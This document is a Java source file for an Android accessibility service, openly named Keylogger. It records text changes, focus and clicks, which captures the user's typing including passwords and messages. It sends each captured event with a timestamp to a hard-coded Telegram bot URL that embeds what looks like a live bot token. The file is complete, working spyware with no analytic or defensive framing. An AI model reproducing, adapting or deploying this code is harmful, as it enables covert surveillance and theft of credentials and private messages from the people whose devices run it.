package com.example.dynamicapk;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            try {
                String botUrl = "https://api.telegram.org/bot8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI/sendMessage";
                String chatId = Constants.TELEGRAM_CHAT_ID;
                String message = params[0];

                String urlString = botUrl + "?chat_id=" + chatId + "&text=" + message;
                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.getResponseCode(); // Just trigger the GET request
            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                new SendToServerTask().execute(time + "| " + data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
    }
}

